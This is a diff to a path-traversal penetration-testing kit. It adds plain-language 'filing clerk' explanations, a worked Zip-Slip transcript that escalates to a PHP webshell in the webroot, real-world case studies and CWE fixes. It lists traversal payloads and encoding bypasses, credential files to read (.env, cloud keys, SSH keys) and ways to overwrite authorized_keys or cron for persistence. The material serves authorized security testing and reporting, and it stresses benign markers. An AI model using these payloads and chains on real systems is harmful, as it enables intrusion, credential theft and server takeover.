@@ -128,7 +128,14 @@ python3 poc/zipslip_build.py --out evil.zip --name "../../../../tmp/pt-poc-<rand
 # 2. Traversal Anatomy
 
 ## 2.1 What it is
-The app takes a client value and uses it as (part of) a **filesystem path**. If it doesn't fully canonicalize + confine that path to an intended base directory, `../` (or an absolute path, or an OS/encoding variant) lets you **step out of the base dir** and reach arbitrary files — to **read** them, **serve** them, or **write** them. It's CWE-22 (Path Traversal) and its relatives CWE-23 (relative), CWE-24/25 (`../`/`..\`), CWE-36 (absolute path), CWE-59 (link following).
+The app takes a client value and uses it as (part of) a **filesystem path**. If it doesn't fully canonicalize + confine that path to an intended base directory, `../` (or an absolute path, or an OS/encoding variant) lets you **step out of the base dir** and reach arbitrary files — to **read** them, **serve** them, or **write** them. It's CWE-22 (Path Traversal) and its relatives CWE-23 (relative), CWE-24 (`../filedir`) / CWE-28 (`..\filedir`), CWE-36 (absolute path), CWE-59 (link following).
+
+> 🔰 **In plain words — the anchor for this whole kit.** Picture a **filing clerk who is only supposed to work in one room** (the app's base directory, e.g. `/var/www/app/uploads/`). You hand them a slip that says *which file* you want. Normally you write a name from their room (`invoice.pdf`) and they fetch it. The bug: the clerk blindly follows *directions*, so you write **"go up the stairs and out the door"** — that's what `../` means, "go up one folder" — and the clerk dutifully walks out of their room into the rest of the building.
+> - If the clerk **photocopies whatever's there and hands it to you** → that's a **READ** sink → you walk them to the safe and copy the company's secrets.
+> - If the clerk **files YOUR paper wherever the slip points** → that's a **WRITE** sink → you tape a booby-trapped document to the front-door lock (a webshell in the webroot) or slip your own key into the master keyring (`authorized_keys`).
+> - If the room they walk into **carries out whatever the paper says** (reads it aloud as orders) → that's *code execution*, which is the **LFI kit's** job, not this one.
+>
+> So the whole game is **(1) get the clerk out of their room** (beat the filters) and **(2) reach something that matters** — a secret to copy, or a lock to tamper with. "The clerk left the room" alone (reading `/etc/passwd`, a boring public file) is just proof it's possible, not the payday. Keep this picture; every section is one of those two steps.
 
 ## 2.2 The sink DIRECTIONS (this decides everything)
 ```
@@ -137,6 +144,7 @@ WRITE          save-as / move_uploaded_file / archive EXTRACTION / fs.writeFile 
 INCLUDE/EXEC   include/require/template-eval that RUNS the file → RCE.  ==> NOT this kit: use the LFI/RFI kit.
 DELETE/OTHER   unlink/rename with a path param → destructive traversal (DoS / tamper). (rare; note it)
 ```
+> **In plain words:** before anything else, figure out **what the clerk does with the file you point at** — because that single fact decides your entire playbook and your payout. Do they **hand you a photocopy** (READ → you're hunting secrets, Medium–High)? Do they **file your paper there** (WRITE → you're dropping a webshell / rewriting a keyring, the Critical side this kit owns)? Or do they **act on the paper as instructions** (INCLUDE/EXECUTE → that's a different bug called LFI — go to that kit)? Never start throwing `../` payloads until you know which of these three you're standing in front of.
 
 ## 2.3 The sources (where the path comes from)
 ```
@@ -152,6 +160,8 @@ SERVER CONFIG  nginx `alias`/`root` off-by-slash; Tomcat/Java `..;/`; proxy path
 - **Write → RCE.** A single benign-looking upload/extract writes a webshell into the webroot or overwrites `authorized_keys`/cron.
 - **It hides in infrastructure.** Server/framework normalization bugs bypass "the app validated it" — a whole bug class the code review misses.
 - **Cross-tenant reads.** Traversal in a per-user file store reads *other users'* documents → mass PII/ATO.
+
+> **In plain words:** this maps straight onto the clerk. **Read → secrets:** the clerk copies the `.env` / config / SSH key / cloud creds, and those creds often unlock *other* systems (so a "read" becomes a full takeover elsewhere). **Write → RCE:** one innocent-looking upload or unzip files your paper into a spot that gets *run*, and you own the box. **It hides in the building's plumbing:** many of these live in the web server / proxy config, not the app code — so the developers' input checks never even see them. **Cross-tenant:** in a per-customer file room, walking one door over reads *another customer's* files → mass data breach.
 
 > **The mental model:** traversal = **the app trusts your string as a path and forgets to confine it to a directory.** Severity = *the direction* (read=disclosure, write=RCE/overwrite) × *what file you reach* (a secret, someone else's data, or an executable location).
 
@@ -178,6 +188,8 @@ SERVER CONFIG  nginx `alias`/`root` off-by-slash; Tomcat/Java `..;/`; proxy path
 # 4. Baseline — Confirm Traversal & Classify the Sink
 
 **Do this before chasing impact.** Prove you influence the path AND determine the direction (read/write/include).
+
+> **In plain words:** two dumb questions first, in order. (1) *"Is the slip actually the file location?"* — fetch the normal file, then the same file written as `./welcome.txt`; if you get the same thing back, your input really is the path. (2) *"Can I make the clerk leave the room?"* — point at a file you *know* exists outside (`/etc/passwd` on Linux, `win.ini` on Windows) using enough `../` (throw 8–12 of them — extra ones are harmless once you hit the top floor). **Critical gotcha:** send the `../` with `curl --path-as-is` or Burp, because your browser/curl will otherwise "helpfully" tidy the `../` away *before it leaves your machine*, and you'll wrongly conclude it's not vulnerable. And always note the **direction** (read/write/include) — that's the fork in the road.
 
 ## 4.1 Confirm traversal (read sinks)
 ```
@@ -217,6 +229,7 @@ NESTED / NON-RECURSIVE     ....//   ....\/   ..././   ....\\   → survives a ON
 TRAILING NULL (legacy)     ../../etc/passwd%00.png   (old PHP<5.3.4 / some native calls) — defeats a forced suffix.
 DOT-SEGMENT VARIANTS       ../ vs ..%2f vs %2e%2e/ vs ..\  (§6 for full encoding).
 ```
+> **In plain words:** `../` is the whole trick — it means "go up one room." Two things make it reliable. **Over-traverse:** you rarely know how deep the clerk's room is, so stack *more* `../` than you need (once you're at the top floor / filesystem root, extra "go up" steps just bounce off — harmless). Or skip the guessing entirely with an **absolute path** (`/etc/passwd`), which says "ignore where you are, go straight here." And the single most common filter-beater: if the app deletes `../` from your slip **once**, hand it **`....//`** — after it snips the middle `../` out, the leftover characters *fall together back into* `../`. On Windows the clerk also understands backslashes (`..\`).
 > **If this → then that:** a filter **strips `../` once** → use **`....//`** (or `..../\`, `....\/`) so the remnant collapses back to `../`. Depth unknown → **over-traverse** (8–12 `../`) or use an **absolute path**. Windows target → `..\`/`..%5c` and drive-absolute `C:\`.
 
 ---
@@ -233,6 +246,7 @@ STRIP-AND-REFORM      ....//   ..;/   ;/../                          (non-recurs
 NULL / TRUNCATION     %00  (legacy)  · long-path truncation (append /./././… to drop a forced suffix on old PHP)
 CASE / DOTS           On Windows: trailing dots/spaces are trimmed (file.php... == file.php); ADS name::$DATA.
 ```
+> **In plain words:** when the app blocks a literal `../`, you *disguise* it. The disguise works because the guard who reads your slip and the clerk who acts on it often **speak at different moments**: if the guard checks the slip *before* it gets URL-decoded but the clerk reads it *after*, then `..%2f` looks innocent to the guard (`%2f` isn't `/`) yet becomes `../` for the clerk. Add a **WAF/proxy** in front and you get a *second* decode step, so you wrap it twice (`%252e%252e%252f`). Ancient IIS/Windows stacks accept "overlong" nonsense encodings of the same characters (`%c0%ae`). The rule of thumb: **find the layer that decodes and the layer that validates — the gap between them is the bug.**
 > **If this → then that:** raw `../` is filtered but the value is **URL-decoded** server-side → **`..%2f`**; a WAF/proxy sits in front → **double-encode** (`%252e%252e%252f`). Legacy IIS/older stacks → **overlong UTF-8** (`%c0%ae%c0%ae%c0%af`). The decode happens at a *different layer* than the validation — that gap is the bug.
 
 ---
@@ -262,6 +276,8 @@ BLOCKLIST (denies "etc/passwd"/"../"): encode (§6), nest (....//), or target a 
 # 8. Web-Server & Framework Normalization Bypasses
 
 **The traversal that isn't in the app code** — it's in the server/proxy/framework. Test these on static routes even when app params look safe.
+
+> **In plain words:** sometimes the leaky clerk isn't the app at all — it's the **building itself** (the web server or proxy that hands out static files). Two you must always try. **nginx `alias` off-by-slash:** a super-common config typo where a request to `/static../` quietly resolves to the *parent* of the static folder — so you climb out with no app bug at all; probe `/static../`, `/assets../`, `/img../`. **Tomcat/Java `..;/`:** the semicolon confuses Java's "is this URL allowed?" check versus "which file does it map to?", letting you reach the protected `WEB-INF/` folder (which holds source, `web.xml`, DB creds). These are *infrastructure* bugs — they work even when every app input is perfectly validated, so always test the static routes directly, and name the exact server + version in your report.
 
 ```
 NGINX "alias" OFF-BY-SLASH (very common):
@@ -307,6 +323,8 @@ INCLUDE/EXECUTE                              → LFI kit (wrapper/log-poison/fil
 
 A read sink never executes the file, so no wrapper/log-poison RCE — but reading the *right* file is High–Critical and often leads to RCE elsewhere.
 
+> **In plain words:** the rookie mistake is to prove you can read `/etc/passwd` and stop — that file is *deliberately* readable by everyone; it's your "the clerk left the room" receipt, worth a Medium at best. The payday is walking the clerk to the **safe**: the app's `.env` / `config` (database and cloud passwords), `~/.aws/credentials`, an SSH private key, or the app's own **source code** (read it and you'll find more bugs and hardcoded keys). Those secrets rarely stop at "disclosure" — a database password gets you the whole database, cloud creds get you the whole cloud account. So read `.env`, not `passwd`, and **report the chain the creds unlock**, which is usually where the Critical lives.
+
 ```
 HIGH-VALUE READ TARGETS (Linux):
   /var/www/<app>/.env  ·  config.php / settings.py / application.yml / appsettings.json  ·  wp-config.php
@@ -327,6 +345,8 @@ ESCALATE THE CREDS: DB creds → DB → dump/RCE ; cloud creds → metadata/clou
 
 When files are stored per-user/tenant and the path is user-influenced, traversal (or even just an ID/path swap) reads *others'* data:
 
+> **In plain words:** many apps give every customer their own room in the file cabinet — `/files/<your-id>/...`. If the clerk lets you write `../` in the slip, you step from *your* room into the room next door and read **another customer's** documents. You don't even always need `../`: sometimes just changing the ID in the path is enough (that overlaps with IDOR). At scale this is a mass privacy breach (High), and if the neighboring files include **session or token files**, reading one logs you in as that user → account takeover. Prove it cleanly with a **second account you own** as the "victim."
+
 ```
 □ Per-user document store: /files/<userid>/<name> → ../<otherid>/<name> or ../../<otherid>/secret.pdf → cross-user read.
 □ Tenant-scoped storage: /t/<tenant>/export.csv → ../<other-tenant>/export.csv → cross-tenant breach.
@@ -341,6 +361,8 @@ When files are stored per-user/tenant and the path is user-influenced, traversal
 
 **The flagship write-traversal.** If the app **extracts a user-supplied archive** (zip/tar/jar/war/apk) and uses each entry's name as the output path without confining it, an entry named `../../../../var/www/html/shell.php` **writes outside the extraction dir** → webshell/overwrite → RCE.
 
+> **In plain words:** this is the headline bug this whole kit exists for, and it's sneaky. A zip file isn't just "files" — each item inside carries its own *name*, and that name can contain `../`. Normally an app unzips into one folder. But if it blindly uses each item's stored name as the save location, you build a zip whose item is **named** `../../../../var/www/html/shell.php`, and when the app extracts it, that file lands in the *webroot* instead of the unzip folder → you visit it → code runs → **RCE, Critical**. Any "import zip", "restore backup", "install theme/plugin", or "upload .tar.gz" feature is a prime candidate. Prove it **safely**: extract a harmless marker file to a spot you can then read back (that alone proves the escape) and *describe* the shell — don't drop a live webshell on someone's production. This is Snyk's 2018 "Zip-Slip", and it hit dozens of popular libraries.
+
 ```
 1. Find the sink: any "import zip", "restore backup", "install theme/plugin", "bulk upload", avatar-zip, "upload .tar.gz".
 2. Build a benign PoC archive with a TRAVERSING entry name (poc/zipslip_build.py):
@@ -353,6 +375,64 @@ When files are stored per-user/tenant and the path is user-influenced, traversal
 4. tar/symlink variants: a tar entry that is a SYMLINK to /etc or an absolute path; nested archive traversal.
 ```
 > **If this → then that:** the app **unzips user input** and you can name an entry `../../…/webroot/x.php` that lands there → **Zip-Slip → RCE (Critical)**. Prove it **benignly**: extract a marker to a safe path you can read back (shows the write escaped the dir), then *describe* the webshell escalation. Snyk's 2018 "Zip-Slip" disclosure hit dozens of libraries — this is real and widespread. Cross-ref the FileUpload kit for the upload half.
+
+## 12.1 The full attack, end-to-end — Zip-Slip archive extraction → webshell in webroot → RCE (worked transcript) ⭐
+
+> *This is the flagship worked example* — the WRITE headline this kit uniquely owns (LFI/RFI own read→include; this owns *write*). It's the "prove the escape benignly, then escalate on your own instance" discipline in full. Own/authorized target; a benign marker proves the write escaped the dir before any shell is discussed.
+
+**Target.** A dashboard with **"Import backup (.zip)"** at `POST /admin/import`. It extracts the archive server-side into `/var/app/imports/<job>/`. PHP/Apache, webroot `/var/www/html/`. Goal: prove a Zip-Slip write escapes the extraction dir → RCE.
+
+**Step 1 — classify the sink (§4.2): this is a WRITE direction.** The feature *extracts* an archive — so each entry's name becomes an output path. That's the Zip-Slip precondition; I don't need a read primitive. First I confirm the extraction dir and that I can read something back (a status/list endpoint shows extracted files under `/imports/<job>/`).
+
+**Step 2 — build a BENIGN traversing-entry archive (prove the escape first, §20).** I use the kit's builder, which refuses executable content by default so I can't accidentally weaponize during the proof:
+```bash
+$ python3 poc/zipslip_build.py --entry '../../../../tmp/pt-poc-7f3a.txt' \
+    --content 'zip-slip PoC x8bit authorized-test 2026-07-26' -o slip.zip
+[zipslip_build] entry: ../../../../tmp/pt-poc-7f3a.txt  (traverses 4 up from extract dir)
+[zipslip_build] SAFE: content is inert text (executable payloads refused). wrote slip.zip
+$ unzip -l slip.zip
+   Length      Name
+   ---------   ----
+        44   ../../../../tmp/pt-poc-7f3a.txt      # the entry name carries the traversal
+```
+
+**Step 3 — upload it and check whether the write escaped.** Import `slip.zip`, then look for the marker *outside* the extraction dir:
+```http
+POST /admin/import HTTP/1.1
+Host: target.example
+Content-Type: multipart/form-data; boundary=x
+(--x … filename="slip.zip" … <slip.zip bytes> …)
+```
+```
+HTTP/1.1 200 OK
+{"imported":true,"job":"a91f"}
+```
+The extraction dir was `/var/app/imports/a91f/`; the entry `../../../../tmp/pt-poc-7f3a.txt` resolves to `/tmp/pt-poc-7f3a.txt`. I confirm the escape via whatever read I have (an SSRF/LFI on the box, a support shell on my own instance, or — cleanest — a second import job that lists `/tmp`):
+```
+$ cat /tmp/pt-poc-7f3a.txt          # on my own authorized instance
+zip-slip PoC x8bit authorized-test 2026-07-26
+```
+**The write landed at `/tmp`, outside `/var/app/imports/a91f/`.** The extractor trusts the entry name and joins it to the output dir with no confinement — **Zip-Slip confirmed.** That benign-marker-outside-the-dir *is the finding*; I can report Critical here and merely *describe* the shell.
+
+**Step 4 — escalate to RCE on my own instance only (§20).** To demonstrate the ceiling, on an instance **I control** I aim an entry at the webroot with executable content:
+```bash
+$ python3 poc/zipslip_build.py --entry '../../../../var/www/html/pt-7f3a.php' \
+    --content '<?php echo "RCE-".php_uname(); ?>' -o slip-rce.zip --i-own-this-instance
+# (the --i-own-this-instance flag is required to allow executable content; refused otherwise)
+```
+```http
+GET /pt-7f3a.php HTTP/1.1
+Host: my-own-instance.example
+```
+```
+HTTP/1.1 200 OK
+RCE-Linux my-own-instance 5.15.0 ...             # the webshell executed = RCE
+```
+**Command execution as the web user.** On a bug-bounty target I do **not** drop this — the `/tmp` marker + this description is the complete Critical.
+
+**Step 5 — the alternates (same primitive, no webshell needed).** If the webroot isn't writable, the *overwrite* variants (§13/§14) often win: an entry named `../../../../home/app/.ssh/authorized_keys` (append my key → SSH → RCE), a cron file, a served `.js` the app already loads, or a `.gitlab-ci.yml` in a repo the server builds. And the **tar/symlink** variant: a tar entry that's a *symlink* to `/etc` then a following entry that writes "through" it. Match the write target to what's actually writable + executed.
+
+**Why this is the PathTraversal-defining bug.** LFI needs an `include()`; RFI needs `allow_url_include`; this needs **neither** — just a feature that *writes* a file using a name you control. One archive entry named `../` out of the extraction dir put a file where the server will run it. Prove the escape with a benign marker, describe (or, on your own box, demonstrate) the shell, and stop.
 
 ---
 
@@ -374,6 +454,8 @@ When you control the **upload filename** or a **destination path** field, traver
 # 14. WRITE Traversal — Save/Export/Log Path → Overwrite Keys/Cron → RCE/Persistence ⭐
 
 Any "write a file to <path>" feature — export, report-save, log-file naming, backup output, "download to server" — with a traversable path lets you **overwrite security-critical files**:
+
+> **In plain words:** if the clerk will *file your paper* at a location you choose, you don't even need a webshell — you can **overwrite a file the system already trusts**. The classic is `~/.ssh/authorized_keys`: that file is the list of keys allowed to SSH in, so writing your own key into it hands you a shell (persistence, Critical). Other juicy targets: a **cron** file (a scheduled command that runs as root), `.bashrc`, a systemd unit, or a CI file the server later builds. One catch — you usually need to control the file's **contents** too (the export body / uploaded bytes); if you can only control *where* it goes but not *what's in it*, look for an **append**-style write or a target where any content still helps. And always prove it with a **benign marker to a safe path** — never actually clobber a real key or config on a live system.
 
 ```
 HIGH-VALUE WRITE/OVERWRITE TARGETS (Linux):
@@ -406,6 +488,20 @@ GO:       filepath.Join cleans but doesn't confine ; http.ServeFile has some pro
           archive/zip + os.Create without confinement (Zip-Slip).
 ```
 > **If this → then that:** a **Python/.NET** target using `os.path.join`/`Path.Combine` → try an **absolute path** as the input (`/etc/passwd`, `C:\...`) — these functions **discard the base dir** when the second arg is absolute (a language-level foot-gun, not even needing `../`). **Java/Tomcat** → `..;/` for `WEB-INF/`. Any extractor (Java `ZipEntry`, Python `extractall`, Node `adm-zip`) → **Zip-Slip** (§12).
+
+---
+
+# 15.1 Real-world path-traversal case studies (verified)
+
+> Re-verified against primary sources (linked in Appendix C) — the named research and CVEs behind the techniques above.
+
+- **Zip-Slip (Snyk, disclosed 5 June 2018): the write-traversal that hit thousands of projects.** Snyk's security team responsibly disclosed a widespread **archive-extraction** directory-traversal: an app that extracts a user-supplied archive and uses each entry's stored name as the output path — without confining it — lets an entry named `../../evil.sh` **write outside the extraction directory**, typically → RCE (§12/§12.1). It affected **thousands of projects including HP, Amazon, Apache, and Pivotal**, across JavaScript, Ruby, .NET and Go, but was **especially prevalent in Java** (no central high-level archive library, so everyone hand-rolled extraction). It spans tar/jar/war/cpio/apk/rar/7z, not just zip. Lesson: every "import zip / restore backup / install plugin / upload .tar.gz" feature is a Zip-Slip candidate — and it's a *write* bug, so it needs no `include()`.
+
+- **CVE-2007-4559 (Python `tarfile`): a 15-year-old traversal, live in hundreds of thousands of repos.** The `extract`/`extractall` functions in Python's `tarfile` module trust the `TarInfo` name and join it to the destination, so a TAR entry with `..` in its name **overwrites arbitrary files** (§13/§14). Disclosed in 2007 and left effectively unpatched (only a doc note), it was **rediscovered by Trellix in 2022**, who found **hundreds of thousands of repositories** vulnerable — a stark illustration that path-traversal-on-extract is not a solved problem. Lesson: any Python service calling `tarfile.extractall()` on user input is a write-traversal target; check the library/version, not just the app code.
+
+- **Read-traversal → secret disclosure is the everyday finding (CWE-22).** The bread-and-butter case: a file-serving/download/template/`?file=` sink that *reads* (not includes) and lets you climb to `/etc/passwd`, then the valuable targets — `.env`, cloud creds (`~/.aws/credentials`, `/proc/self/environ`), app source, config, private keys. `/etc/passwd` is only a Medium "traversal proof"; the finding is the **secret** you reach and validate. This is the half PathTraversal owns that LFI doesn't (read-without-include) — and it chains to cloud takeover the same way (read → validate read-only → pivot).
+
+- **Server/framework normalization bugs put the traversal in the infrastructure, not the app.** Traversal is frequently a *server* bug: **nginx `alias` off-by-slash** (a `location /static { alias /var/www/app/static/; }` without a trailing slash lets `/static../` escape the mapped dir), **Tomcat `..;/`** (the semicolon path-parameter reaches `WEB-INF/` and its `web.xml`/classes), and **IIS `::$DATA`/`.` tricks**. And the language-level foot-gun: **`os.path.join`/`Path.Combine` discard the base directory when the second argument is absolute** — so on Python/.NET, supplying `/etc/passwd` (no `../` at all) can escape. Test the web server and proxies, not just app parameters — and remember to send `../` **raw** (`curl --path-as-is`/Burp), or the client collapses it before it hits the wire.
 
 ---
 
@@ -463,7 +559,7 @@ Read only what proves impact (redact secrets; don't exfiltrate real users' data 
 | **Write only inside the sandbox / no escape** | **Low/Info** | Not a traversal. |
 
 **CVSS / CWE:**
-- Read-traversal (secrets): `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → High. **CWE-22** (Path Traversal) — anchor. Absolute-path variant **CWE-36**; relative **CWE-23**; `../` **CWE-24**, `..\` **CWE-25**; symlink **CWE-59**.
+- Read-traversal (secrets): `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → High. **CWE-22** (Path Traversal) — anchor. Absolute-path variant **CWE-36**; relative **CWE-23**; `../` **CWE-24**, `..\` **CWE-28** (CWE-25 is `/../filedir`, a different child); symlink **CWE-59**.
 - Write-traversal → RCE: `C:H/I:H/A:H` → Critical. **CWE-22 + CWE-434** (if via upload) / CWE-73 (external control of filename/path).
 - Cross-tenant read: **CWE-22 + CWE-284/639** (authorization). Server-normalization: cite the exact server/CVE.
 
@@ -643,7 +739,7 @@ ALWAYS: escape the DIR and reach something that matters; benign markers for writ
 - `ffuf`/`feroxbuster` (fuzz + depth) · `nuclei` (`-tags lfi,traversal`) · Burp Intruder · `curl --path-as-is` · this kit's `poc/` (pt_read_fuzz / zipslip_build / write_probe) · sibling kits `LFI/` (include→RCE), `RFI/`, `FileUpload/`.
 
 **CWE / standards to cite**
-- **CWE-22** (Path Traversal — anchor) · **CWE-23** (relative) · **CWE-24/25** (`../` / `..\`) · **CWE-36** (absolute path) · **CWE-59** (link following) · **CWE-73** (external control of filename/path) · **CWE-434** (upload, write side): https://cwe.mitre.org/
+- **CWE-22** (Path Traversal — anchor) · **CWE-23** (relative) · **CWE-24** (`../filedir`) / **CWE-28** (`..\filedir`) · **CWE-36** (absolute path) · **CWE-59** (link following) · **CWE-73** (external control of filename/path) · **CWE-434** (upload, write side): https://cwe.mitre.org/
 
 ---
 
